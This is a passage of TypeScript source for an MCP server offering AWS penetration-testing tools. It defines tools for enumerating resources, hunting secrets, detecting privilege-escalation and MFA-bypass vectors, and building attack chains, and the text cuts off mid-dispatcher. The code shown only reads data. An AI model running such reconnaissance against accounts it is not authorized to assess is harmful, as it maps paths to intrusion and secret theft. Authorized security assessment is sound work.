#!/usr/bin/env node

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  Tool,
} from "@modelcontextprotocol/sdk/types.js";

// AWS SDK imports - Phase 1
import { EC2Client, DescribeInstancesCommand, DescribeSecurityGroupsCommand, DescribeVpcsCommand, DescribeSubnetsCommand } from "@aws-sdk/client-ec2";
import { S3Client, ListBucketsCommand, GetBucketPolicyCommand, GetBucketEncryptionCommand, GetPublicAccessBlockCommand, GetBucketAclCommand, GetBucketVersioningCommand, GetBucketLoggingCommand, GetBucketPolicyStatusCommand, GetBucketLocationCommand } from "@aws-sdk/client-s3";
import { IAMClient, ListUsersCommand, ListRolesCommand, ListPoliciesCommand, GetPolicyVersionCommand, ListAttachedUserPoliciesCommand, ListAttachedRolePoliciesCommand, ListUserPoliciesCommand, GetUserPolicyCommand, ListRolePoliciesCommand, GetRolePolicyCommand, GetRoleCommand, ListGroupsForUserCommand, ListAttachedGroupPoliciesCommand, GetPolicyCommand } from "@aws-sdk/client-iam";
import { RDSClient, DescribeDBInstancesCommand, DescribeDBClustersCommand } from "@aws-sdk/client-rds";
import { STSClient, GetCallerIdentityCommand } from "@aws-sdk/client-sts";
import { OrganizationsClient, ListAccountsCommand, DescribeOrganizationCommand } from "@aws-sdk/client-organizations";

// AWS SDK imports - Phase 2
import { EKSClient, ListClustersCommand, DescribeClusterCommand, ListNodegroupsCommand, DescribeNodegroupCommand, ListFargateProfilesCommand, DescribeFargateProfileCommand } from "@aws-sdk/client-eks";
import { LambdaClient, ListFunctionsCommand, GetFunctionCommand } from "@aws-sdk/client-lambda";
import { SecretsManagerClient, ListSecretsCommand, DescribeSecretCommand } from "@aws-sdk/client-secrets-manager";
import { KMSClient, ListKeysCommand, DescribeKeyCommand } from "@aws-sdk/client-kms";
import { CloudTrailClient, DescribeTrailsCommand, GetTrailStatusCommand } from "@aws-sdk/client-cloudtrail";

// AWS SDK imports - Phase 3 (new services)
import { DynamoDBClient, ListTablesCommand, DescribeTableCommand, DescribeContinuousBackupsCommand } from "@aws-sdk/client-dynamodb";
import { APIGatewayClient, GetRestApisCommand, GetStagesCommand, GetResourcesCommand } from "@aws-sdk/client-api-gateway";
import { CloudFrontClient, ListDistributionsCommand, GetDistributionConfigCommand } from "@aws-sdk/client-cloudfront";
import { ElastiCacheClient, DescribeCacheClustersCommand, DescribeReplicationGroupsCommand } from "@aws-sdk/client-elasticache";
import { GuardDutyClient, ListDetectorsCommand, ListFindingsCommand, GetFindingsCommand } from "@aws-sdk/client-guardduty";

// AWS SDK imports - Phase 4 (messaging and identity)
import { SNSClient, ListTopicsCommand, GetTopicAttributesCommand, ListSubscriptionsByTopicCommand } from "@aws-sdk/client-sns";
import { SQSClient, ListQueuesCommand, GetQueueAttributesCommand, GetQueueUrlCommand } from "@aws-sdk/client-sqs";
import { CognitoIdentityClient, ListIdentityPoolsCommand, DescribeIdentityPoolCommand } from "@aws-sdk/client-cognito-identity";
import { CognitoIdentityProviderClient, ListUserPoolsCommand, DescribeUserPoolCommand } from "@aws-sdk/client-cognito-identity-provider";

// AWS SDK imports - Phase 5 (CloudFormation, EventBridge)
import { CloudFormationClient, ListStacksCommand, DescribeStacksCommand, ListStackResourcesCommand } from "@aws-sdk/client-cloudformation";
import { CloudWatchClient, DescribeAlarmsCommand } from "@aws-sdk/client-cloudwatch";

// Report generation imports
import PDFDocument from "pdfkit";
import { marked } from "marked";
import { createObjectCsvWriter } from "csv-writer";
import * as fs from "fs";

// Utility imports - Caching, Rate Limiting, Retry Logic
import { cache, withRetry, safeApiCall, rateLimiters } from "./utils.js";

// Initialize AWS clients with default credentials
const DEFAULT_REGION = process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION || "us-east-1";

// All AWS regions for multi-region scanning
const AWS_REGIONS = [
  "us-east-1", "us-east-2", "us-west-1", "us-west-2",
  "eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1", "eu-central-2",
  "eu-north-1", "eu-south-1", "eu-south-2",
  "ap-south-1", "ap-south-2", "ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
  "ap-southeast-1", "ap-southeast-2", "ap-southeast-3", "ap-southeast-4", "ap-east-1",
  "sa-east-1", "ca-central-1", "ca-west-1",
  "me-south-1", "me-central-1", "af-south-1",
  "il-central-1"
];

// Common regions for faster scanning (covers 90%+ of deployments)
const COMMON_REGIONS = [
  "us-east-1", "us-east-2", "us-west-1", "us-west-2",
  "eu-west-1", "eu-west-2", "eu-central-1",
  "ap-south-1", "ap-northeast-1", "ap-southeast-1", "ap-southeast-2"
];

// Helper function to resolve region parameter
function resolveRegions(region: string): string[] {
  if (region === "all") return AWS_REGIONS;
  if (region === "common") return COMMON_REGIONS;
  return [region];
}

// Multi-region scan wrapper
async function multiRegionScan<T>(
  region: string,
  scanFn: (r: string) => Promise<T>,
  formatFn: (results: { region: string; data: T }[]) => string
): Promise<string> {
  const regions = resolveRegions(region);
  const results: { region: string; data: T }[] = [];
  
  for (const r of regions) {
    try {
      const data = await scanFn(r);
      results.push({ region: r, data });
    } catch (error: any) {
      // Skip regions with no access or no resources
    }
  }
  
  return formatFn(results);
}

const ec2Client = new EC2Client({ region: DEFAULT_REGION });
const s3Client = new S3Client({ region: DEFAULT_REGION });
const iamClient = new IAMClient({ region: DEFAULT_REGION });
const rdsClient = new RDSClient({ region: DEFAULT_REGION });
const stsClient = new STSClient({ region: DEFAULT_REGION });
const orgsClient = new OrganizationsClient({ region: DEFAULT_REGION });
const eksClient = new EKSClient({ region: DEFAULT_REGION });
const lambdaClient = new LambdaClient({ region: DEFAULT_REGION });
const secretsClient = new SecretsManagerClient({ region: DEFAULT_REGION });
const kmsClient = new KMSClient({ region: DEFAULT_REGION });
const cloudtrailClient = new CloudTrailClient({ region: DEFAULT_REGION });
const dynamodbClient = new DynamoDBClient({ region: DEFAULT_REGION });
const apigatewayClient = new APIGatewayClient({ region: DEFAULT_REGION });
const cloudfrontClient = new CloudFrontClient({ region: DEFAULT_REGION });
const elasticacheClient = new ElastiCacheClient({ region: DEFAULT_REGION });
const guarddutyClient = new GuardDutyClient({ region: DEFAULT_REGION });
const snsClient = new SNSClient({ region: DEFAULT_REGION });
const sqsClient = new SQSClient({ region: DEFAULT_REGION });
const cognitoIdentityClient = new CognitoIdentityClient({ region: DEFAULT_REGION });
const cognitoIdpClient = new CognitoIdentityProviderClient({ region: DEFAULT_REGION });
const cloudformationClient = new CloudFormationClient({ region: DEFAULT_REGION });
const cloudwatchClient = new CloudWatchClient({ region: DEFAULT_REGION });

// Server setup
const server = new Server(
  {
    name: "nimbus-mcp",
    version: "1.4.2",
  },
  {
    capabilities: {
      tools: {},
    },
  }
);

// ============================================
// TOOL DEFINITIONS - ORGANIZED BY CATEGORY
// ============================================

const TOOLS: Tool[] = [
  // ========== UTILITY TOOLS ==========
  {
    name: "help",
    description: "Get comprehensive help about all AWS penetration testing tools with examples and workflow guidance",
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
  {
    name: "whoami",
    description: "Identify current AWS identity (user/role), account ID, and ARN using STS GetCallerIdentity",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region (optional, defaults to us-east-1)",
        },
      },
    },
  },
  // ========== ENUMERATION & DISCOVERY TOOLS ==========
  {
    name: "enumerate_ec2_instances",
    description: "List all EC2 instances with security details (public IPs, security groups, IAM roles). Use region: 'all' for all regions or 'common' for top 11 regions.",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan (e.g., us-east-1), 'all' for all 28 regions, 'common' for top 11 regions",
        },
      },
      required: ["region"],
    },
  },
  // ========== SECURITY ANALYSIS & SCANNING TOOLS ==========
  {
    name: "analyze_s3_security",
    description: "Comprehensive S3 analysis: enumerate all buckets OR scan specific bucket for security issues",
    inputSchema: {
      type: "object",
      properties: {
        bucketName: {
          type: "string",
          description: "Optional: specific S3 bucket name. If omitted, enumerates all",
        },
        scanMode: {
          type: "string",
          description: "Mode: 'enumerate' (list buckets), 'security' (analyze), 'both' (default)",
          enum: ["enumerate", "security", "both"],
        },
      },
    },
  },
  {
    name: "analyze_iam_users",
    description: "Enumerate IAM users AND analyze IAM policies for overly permissive permissions",
    inputSchema: {
      type: "object",
      properties: {
        policyArn: {
          type: "string",
          description: "Optional: specific policy ARN to analyze",
        },
        scanMode: {
          type: "string",
          description: "Mode: 'enumerate' (list users), 'policies' (analyze), 'both' (default)",
          enum: ["enumerate", "policies", "both"],
        },
      },
    },
  },
  {
    name: "enumerate_iam_roles",
    description: "List all IAM roles with trust relationships and attached policies",
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
  {
    name: "enumerate_rds_databases",
    description: "List all RDS database instances and clusters with security configuration",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan (e.g., us-east-1)",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "analyze_network_security",
    description: "Enumerate VPCs OR analyze Security Groups for dangerous rules",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        scanMode: {
          type: "string",
          description: "Mode: 'vpcs' (VPCs), 'security_groups' (SGs), 'both' (default)",
          enum: ["vpcs", "security_groups", "both"],
        },
      },
      required: ["region"],
    },
  },
  {
    name: "analyze_lambda_security",
    description: "Enumerate Lambda functions OR identify execution role risks",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        scanMode: {
          type: "string",
          description: "Mode: 'enumerate' (list), 'roles' (analyze), 'both' (default)",
          enum: ["enumerate", "roles", "both"],
        },
      },
      required: ["region"],
    },
  },
  // ========== NETWORK & INFRASTRUCTURE SECURITY ==========
  {
    name: "enumerate_eks_clusters",
    description: "List all EKS clusters with security configuration and network settings",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "scan_secrets_manager",
    description: "List secrets in Secrets Manager and check for rotation, encryption, and access policies",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "enumerate_public_resources",
    description: "Find all publicly accessible resources (EC2 with public IPs, S3 buckets, RDS instances) - attack surface mapping",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "generate_security_report",
    description: "Generate comprehensive security assessment report with all findings (PDF/HTML/CSV export)",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        format: {
          type: "string",
          description: "Output format: 'markdown' (default), 'pdf', 'html', or 'csv'",
          enum: ["markdown", "pdf", "html", "csv"],
        },
        outputFile: {
          type: "string",
          description: "Optional: Save report to file path (e.g., C:\\reports\\aws-security.pdf)",
        },
      },
      required: ["region"],
    },
  },
  // ========== DATA & ENCRYPTION SECURITY ==========
  {
    name: "analyze_encryption_security",
    description: "KMS keys (rotation, policies) AND DynamoDB tables (encryption, point-in-time recovery, backups)",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        resourceType: {
          type: "string",
          description: "Type: 'kms' (KMS), 'dynamodb' (DynamoDB), 'both' (default)",
          enum: ["kms", "dynamodb", "both"],
        },
        tableName: {
          type: "string",
          description: "Optional: specific DynamoDB table name",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "analyze_api_distribution_security",
    description: "API Gateway (authorization, throttling, logging) AND CloudFront (SSL/TLS, origin access, WAF)",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region (optional for CloudFront)",
        },
        scanMode: {
          type: "string",
          description: "Mode: 'api_gateway', 'cloudfront', 'both' (default)",
          enum: ["api_gateway", "cloudfront", "both"],
        },
      },
    },
  },
  {
    name: "scan_elasticache_security",
    description: "Analyze ElastiCache security: encryption in transit/at rest, auth tokens, subnet groups, security groups",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "get_guardduty_findings",
    description: "Retrieve GuardDuty security findings (threats detected by AWS threat intelligence)",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        severity: {
          type: "string",
          description: "Filter by severity: LOW, MEDIUM, HIGH, or CRITICAL (default: all)",
          enum: ["LOW", "MEDIUM", "HIGH", "CRITICAL"],
        },
      },
      required: ["region"],
    },
  },
  // ========== MESSAGING & APPLICATION SECURITY ==========
  {
    name: "analyze_messaging_security",
    description: "SNS topics, SQS queues, and Cognito security (encryption, access policies, MFA, password policies)",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        scanMode: {
          type: "string",
          description: "Mode: 'sns', 'sqs', 'cognito', 'all' (default)",
          enum: ["sns", "sqs", "cognito", "all"],
        },
      },
      required: ["region"],
    },
  },
  {
    name: "generate_tra_report",
    description: "Generate comprehensive Threat & Risk Assessment (TRA) security report with findings summary and remediation recommendations",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        framework: {
          type: "string",
          description: "Compliance framework: 'cis' (CIS AWS), 'nist' (NIST 800-53), 'pci' (PCI-DSS), 'all' (default)",
          enum: ["cis", "nist", "pci", "all"],
        },
        format: {
          type: "string",
          description: "Output format: 'markdown' (default), 'pdf', 'html', 'csv'",
          enum: ["markdown", "pdf", "html", "csv"],
        },
        outputFile: {
          type: "string",
          description: "Optional: Save report to file path",
        },
      },
      required: ["region"],
    },
  },
  // ========== PHASE 1: INFRASTRUCTURE ANALYSIS TOOLS ==========
  {
    name: "analyze_infrastructure_automation",
    description: "CloudFormation templates (injection risks, IAM permissions) AND EventBridge rules/Lambda persistence mechanisms",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        scanMode: {
          type: "string",
          description: "Mode: 'cloudformation', 'eventbridge', 'both' (default)",
          enum: ["cloudformation", "eventbridge", "both"],
        },
      },
      required: ["region"],
    },
  },
  {
    name: "enumerate_organizations",
    description: "List AWS Organizations accounts, organizational units, and policies for multi-account enumeration",
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
  {
    name: "enumerate_detection_services",
    description: "Enumerate logging and monitoring services: CloudTrail, Config, GuardDuty, CloudWatch, WAF status",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  // ========== PHASE 2: ADVANCED PERMISSION ANALYSIS TOOLS ==========
  {
    name: "analyze_iam_trust_chains",
    description: "Analyze IAM role trust relationships for wildcard principals, cross-account access, and unrestricted service access",
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
  {
    name: "detect_permissive_roles",
    description: "Detect IAM roles with excessive permissions (AdministratorAccess, wildcard actions, overly broad resources)",
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
  // ========== PHASE 3: PERSISTENCE & EVASION DETECTION TOOLS ==========
  {
    name: "detect_persistence_mechanisms",
    description: "Detect persistence backdoors: Lambda layers, EC2 user data, EventBridge triggers, IAM role modifications, access key rotation",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "analyze_service_role_chain",
    description: "Analyze lateral movement through service roles: EC2→Lambda→API Gateway→Database chains",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to analyze",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "analyze_cross_account_movement",
    description: "Analyze potential lateral movement across accounts via cross-account roles, external identities, and organization relationships",
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
  {
    name: "detect_mfa_bypass_vectors",
    description: "Identify MFA bypass vectors: console bypass via API, credential leakage, external identity providers without MFA, emergency access keys",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  // ========== NEW SECURITY TOOLS ==========
  {
    name: "analyze_cloudwatch_security",
    description: "Analyze CloudWatch configuration for security monitoring gaps: missing alarms, log groups without encryption, insufficient retention, missing metric filters for security events",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "scan_ssm_security",
    description: "Analyze AWS Systems Manager security: SSM documents with embedded credentials, parameter store secrets, Session Manager logging, patch compliance",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "analyze_ec2_metadata_exposure",
    description: "Check EC2 instances for IMDSv1 exposure (SSRF risk), analyze instance profiles, and identify potential credential theft vectors",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "scan_resource_policies",
    description: "Comprehensive scan of resource-based policies: S3, SQS, SNS, Lambda, KMS, Secrets Manager for overly permissive access patterns",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
        resourceType: {
          type: "string",
          enum: ["s3", "sqs", "sns", "lambda", "kms", "secrets", "all"],
          description: "Type of resource policies to scan (default: all)",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "analyze_network_exposure",
    description: "Deep network security analysis: internet-facing resources, VPC peering risks, Transit Gateway exposure, NAT Gateway egress points",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "detect_data_exfiltration_paths",
    description: "Identify potential data exfiltration vectors: S3 replication rules, Lambda external connections, EC2 egress routes, cross-account data sharing",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to scan",
        },
      },
      required: ["region"],
    },
  },
  // ========== KUBERNETES SECURITY TOOLS ==========
  {
    name: "scan_eks_service_accounts",
    description: "Scan EKS cluster for service account security issues: default SA auto-mount, SAs with cluster-wide permissions, IRSA not configured, SA impersonation, legacy tokens. Returns findings with MITRE ATT&CK mappings and kubectl commands.",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region where EKS cluster is located",
        },
        clusterName: {
          type: "string",
          description: "EKS cluster name",
        },
      },
      required: ["region", "clusterName"],
    },
  },
  {
    name: "hunt_eks_secrets",
    description: "Hunt for secrets in EKS cluster: enumerate K8s secrets, secrets in env vars, AWS Secrets Manager, SSM Parameter Store, ConfigMap secrets, mounted files, container images, git repos. Returns extraction commands and remediation.",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region where EKS cluster is located",
        },
        clusterName: {
          type: "string",
          description: "EKS cluster name",
        },
      },
      required: ["region", "clusterName"],
    },
  },
  // ========== MULTI-REGION SCANNING TOOLS ==========
  {
    name: "scan_all_regions",
    description: "Scan multiple AWS regions for resources. Supports: ec2, lambda, rds, eks, secrets, guardduty, elasticache, vpc. Specify custom regions OR use presets ('common'=11 regions, 'all'=30+ regions).",
    inputSchema: {
      type: "object",
      properties: {
        resourceType: {
          type: "string",
          description: "Type of resource to scan: ec2, lambda, rds, eks, secrets, guardduty, elasticache, vpc, all",
          enum: ["ec2", "lambda", "rds", "eks", "secrets", "guardduty", "elasticache", "vpc", "all"],
        },
        regions: {
          type: "string",
          description: "Custom regions to scan (comma-separated). Examples: 'us-east-1' or 'us-east-1,eu-west-1,ap-southeast-1'. Overrides scanMode if provided.",
        },
        scanMode: {
          type: "string",
          description: "Preset scan mode (ignored if 'regions' is provided): 'common' (11 regions) or 'all' (30+ regions)",
          enum: ["common", "all"],
        },
        parallelism: {
          type: "number",
          description: "Number of parallel region scans (default: 5, max: 10)",
        },
      },
      required: ["resourceType"],
    },
  },
  {
    name: "list_active_regions",
    description: "Discover which AWS regions have resources deployed. Quick scan to identify active regions before deep scanning. Checks EC2, Lambda, RDS presence.",
    inputSchema: {
      type: "object",
      properties: {
        regions: {
          type: "string",
          description: "Custom regions to check (comma-separated). Examples: 'us-east-1,eu-west-1'. Overrides scanMode if provided.",
        },
        scanMode: {
          type: "string",
          description: "Preset scan mode (ignored if 'regions' is provided): 'common' (11 regions) or 'all' (30+ regions)",
          enum: ["common", "all"],
        },
      },
    },
  },
  // ========== CACHE MANAGEMENT TOOLS ==========
  {
    name: "cache_stats",
    description: "View cache statistics: hit/miss ratio, cached keys, memory usage. Useful for monitoring performance.",
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
  {
    name: "cache_clear",
    description: "Clear cached data. Use after making AWS changes to get fresh results. Can clear all or specific pattern.",
    inputSchema: {
      type: "object",
      properties: {
        pattern: {
          type: "string",
          description: "Optional: Clear only keys matching this pattern (e.g., 'ec2', 's3', 'us-east-1'). If omitted, clears all.",
        },
      },
    },
  },
  // ========== ATTACK CHAIN & ADVANCED ANALYSIS TOOLS ==========
  {
    name: "build_attack_chains",
    description: "Build multi-step attack chains from IAM findings. Identifies complete attack paths from initial access to privilege escalation, lateral movement, and data exfiltration. Maps to MITRE ATT&CK techniques and calculates blast radius.",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region to analyze (default: us-east-1)",
        },
        principalArn: {
          type: "string",
          description: "Optional: Specific IAM principal ARN to analyze attack chains for",
        },
        minSeverity: {
          type: "string",
          enum: ["LOW", "MEDIUM", "HIGH", "CRITICAL"],
          description: "Minimum severity to include (default: HIGH)",
        },
      },
    },
  },
  {
    name: "analyze_eks_attack_surface",
    description: "Comprehensive EKS security analysis: IRSA (IAM Roles for Service Accounts) abuse, node role credential theft via IMDS, cluster config manipulation, pod security risks, and Kubernetes RBAC to AWS IAM privilege escalation paths.",
    inputSchema: {
      type: "object",
      properties: {
        region: {
          type: "string",
          description: "AWS region containing EKS clusters",
        },
        clusterName: {
          type: "string",
          description: "Optional: Specific EKS cluster to analyze (analyzes all if omitted)",
        },
      },
      required: ["region"],
    },
  },
  {
    name: "detect_privesc_patterns",
    description: "Detect 50+ IAM privilege escalation patterns based on Rhino Security Labs research. Identifies PassRole abuse, policy manipulation, credential access, Lambda abuse, and more with detailed remediation steps.",
    inputSchema: {
      type: "object",
      properties: {
        principalArn: {
          type: "string",
          description: "Optional: Specific IAM user/role ARN to analyze",
        },
        includeRemediation: {
          type: "boolean",
          description: "Include detailed remediation steps (default: true)",
        },
      },
    },
  },
];

// Tool handlers
server.setRequestHandler(ListToolsRequestSchema, async () => ({
  tools: TOOLS,
}));

server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;

  try {
    // ========== UTILITY TOOLS ==========
    switch (name) {
      case "help":
        return { content: [{ type: "text", text: getHelpText() }] };

      case "whoami":
        return { content: [{ type: "text", text: await whoami(args?.region as string | undefined) }] };

      // ========== ENUMERATION & DISCOVERY TOOLS ==========
      case "enumerate_ec2_instances":
        if (!args || !args.region) throw new Error("region is required (use 'all', 'common', or specific region like 'us-east-1')");
        return { content: [{ type: "text", text: await enumerateEC2InstancesMultiRegion(args.region as string) }] };

      case "analyze_s3_security":
        return { content: [{ type: "text", text: await analyzeS3Security(args?.bucketName as string | undefined, args?.scanMode as string | undefined) }] };

      case "analyze_iam_users":
        return { content: [{ type: "text", text: await analyzeIAMUsers(args?.policyArn as string | undefined, args?.scanMode as string | undefined) }] };

      case "enumerate_iam_roles":
        return { content: [{ type: "text", text: await enumerateIAMRoles() }] };

      case "enumerate_rds_databases":
        if (!args || !args.region) throw new Error("region is required (use 'all', 'common', or specific region)");
        return { content: [{ type: "text", text: await enumerateRDSDatabasesMultiRegion(args.region as string) }] };

      case "analyze_network_security":
        if (!args || !args.region) throw new Error("region is required (use 'all', 'common', or specific region)");
        return { content: [{ type: "text", text: await analyzeNetworkSecurityMultiRegion(args.region as string, args?.scanMode as string | undefined) }] };

      case "analyze_lambda_security":
        if (!args || !args.region) throw new Error("region is required (use 'all', 'common', or specific region)");
        return { content: [{ type: "text", text: await analyzeLambdaSecurityMultiRegion(args.region as string, args?.scanMode as string | undefined) }] };

      // ========== NETWORK & INFRASTRUCTURE SECURITY ==========
      case "enumerate_eks_clusters":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await enumerateEKSClusters(args.region as string) }] };

      case "analyze_encryption_security":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await analyzeEncryptionSecurity(args.region as string, args?.resourceType as string | undefined, args?.tableName as string | undefined) }] };

      case "analyze_api_distribution_security":
        return { content: [{ type: "text", text: await analyzeAPIDistributionSecurity(args?.region as string | undefined, args?.scanMode as string | undefined) }] };

      case "scan_secrets_manager":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await scanSecretsManager(args.region as string) }] };

      case "enumerate_public_resources":
        if (!args || !args.region) throw new Error("region is required (use 'all', 'common', or specific region)");
        return { content: [{ type: "text", text: await enumeratePublicResourcesMultiRegion(args.region as string) }] };

      case "generate_security_report":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await generateSecurityReport(args.region as string, args.format as string | undefined, args.outputFile as string | undefined) }] };

      case "scan_elasticache_security":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await scanElastiCacheSecurity(args.region as string) }] };

      case "get_guardduty_findings":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await getGuardDutyFindings(args.region as string, args.severity as string | undefined) }] };

      case "analyze_messaging_security":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await analyzeMessagingSecurity(args.region as string, args?.scanMode as string | undefined) }] };

      case "generate_tra_report":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await generateTRAReport(
          args.region as string, 
          args.framework as string | undefined, 
          args.format as string | undefined, 
          args.outputFile as string | undefined
        ) }] };

      case "analyze_infrastructure_automation":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await analyzeInfrastructureAutomation(args.region as string, args?.scanMode as string | undefined) }] };

      case "enumerate_organizations":
        return { content: [{ type: "text", text: await enumerateOrganizations() }] };

      case "enumerate_detection_services":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await enumerateDetectionServices(args.region as string) }] };

      // ========== PHASE 2: ADVANCED PERMISSION ANALYSIS TOOLS ==========
      case "analyze_iam_trust_chains":
        return { content: [{ type: "text", text: await analyzeIAMTrustChains() }] };

      case "detect_permissive_roles":
        return { content: [{ type: "text", text: await findOverlyPermissiveRoles() }] };

      // ========== PHASE 3: PERSISTENCE & EVASION DETECTION TOOLS ==========
      case "detect_persistence_mechanisms":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await detectPersistenceMechanisms(args.region as string) }] };

      case "analyze_service_role_chain":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await analyzeServiceRoleChain(args.region as string) }] };

      case "analyze_cross_account_movement":
        return { content: [{ type: "text", text: await trackCrossAccountMovement() }] };

      case "detect_mfa_bypass_vectors":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await detectMFABypassVectors(args.region as string) }] };

      // New security tools
      case "analyze_cloudwatch_security":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await analyzeCloudWatchSecurity(args.region as string) }] };

      case "scan_ssm_security":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await scanSSMSecurity(args.region as string) }] };

      case "analyze_ec2_metadata_exposure":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await analyzeEC2MetadataExposure(args.region as string) }] };

      case "scan_resource_policies":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await scanResourcePolicies(args.region as string, args?.resourceType as string) }] };

      case "analyze_network_exposure":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await analyzeNetworkExposure(args.region as string) }] };

      case "detect_data_exfiltration_paths":
        if (!args || !args.region) throw new Error("region is required");
        return { content: [{ type: "text", text: await detectDataExfiltrationPaths(args.region as string) }] };

      // ========== KUBERNETES SECURITY TOOLS ==========
      case "scan_eks_service_accounts":
        if (!args || !args.region || !args.clusterName) throw new Error("region and clusterName are required");
        return { content: [{ type: "text", text: await scanEKSServiceAccounts(args.region as string, args.clusterName as string) }] };

      case "hunt_eks_secrets":
        if (!args || !args.region || !args.clusterName) throw new Error("region and clusterName are required");
        return { content: [{ type: "text", text: await huntEKSSecrets(args.region as string, args.clusterName as string) }] };

      // ========== MULTI-REGION SCANNING TOOLS ==========
      case "scan_all_regions":
        if (!args || !args.resourceType) throw new Error("resourceType is required");
        return { content: [{ type: "text", text: await scanAllRegions(
          args.resourceType as string,
          args.scanMode as string | undefined,
          args.parallelism as number | undefined,
          args.regions as string | undefined
        ) }] };

      case "list_active_regions":
        return { content: [{ type: "text", text: await listActiveRegions(
          args?.scanMode as string | undefined,
          args?.regions as string | undefined
        ) }] };

      // ========== CACHE MANAGEMENT TOOLS ==========
      case "cache_stats":
        return { content: [{ type: "text", text: getCacheStats() }] };

      case "cache_clear":
        return { content: [{ type: "text", text: clearCache(args?.pattern as string | undefined) }] };

      // ========== ATTACK CHAIN & ADVANCED ANALYSIS TOOLS ==========
      case "build_attack_chains":
        return { content: [{ type: "text", text: await buildAttackChains(
          args?.region as string || 'us-east-1',
          args?.principalArn as string | undefined,
